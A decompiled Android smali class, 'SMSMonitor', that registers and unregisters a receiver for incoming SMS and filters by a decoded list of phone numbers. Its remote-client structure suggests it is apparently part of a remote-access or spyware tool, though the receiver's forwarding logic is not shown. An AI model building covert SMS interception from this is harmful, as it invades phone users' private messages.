.class public Lmy/app/Library/SMSMonitor;
.super Ljava/lang/Object;
.source "SMSMonitor.java"


# instance fields
.field protected SMSreceiver:Landroid/content/BroadcastReceiver;

.field channel:I

.field ctx:Lmy/app/client/ClientListener;

.field phoneNumberFilter:Ljava/util/HashSet;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashSet",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>(Lmy/app/client/ClientListener;I[B)V
    .locals 3
    .param p1, "c"    # Lmy/app/client/ClientListener;
    .param p2, "chan"    # I
    .param p3, "args"    # [B

    .prologue
    .line 25
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 38
    new-instance v1, Lmy/app/Library/SMSMonitor$1;

    invoke-direct {v1, p0}, Lmy/app/Library/SMSMonitor$1;-><init>(Lmy/app/Library/SMSMonitor;)V

    iput-object v1, p0, Lmy/app/Library/SMSMonitor;->SMSreceiver:Landroid/content/BroadcastReceiver;

    .line 26
    iput-object p1, p0, Lmy/app/Library/SMSMonitor;->ctx:Lmy/app/client/ClientListener;

    .line 27
    iput p2, p0, Lmy/app/Library/SMSMonitor;->channel:I

    .line 28
    invoke-static {p3}, Lutils/EncoderHelper;->decodeHashSet([B)Ljava/util/HashSet;

    move-result-object v1

    iput-object v1, p0, Lmy/app/Library/SMSMonitor;->phoneNumberFilter:Ljava/util/HashSet;

    .line 29
    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    .line 30
    .local v0, "filter":Landroid/content/IntentFilter;
    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 31
    iget-object v1, p0, Lmy/app/Library/SMSMonitor;->ctx:Lmy/app/client/ClientListener;

    iget-object v2, p0, Lmy/app/Library/SMSMonitor;->SMSreceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {v1, v2, v0}, Lmy/app/client/ClientListener;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 32
    return-void
.end method


# virtual methods
.method public stop()V
    .locals 2

    .prologue
    .line 35
    iget-object v0, p0, Lmy/app/Library/SMSMonitor;->ctx:Lmy/app/client/ClientListener;

    iget-object v1, p0, Lmy/app/Library/SMSMonitor;->SMSreceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {v0, v1}, Lmy/app/client/ClientListener;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 36
    return-void
.end method
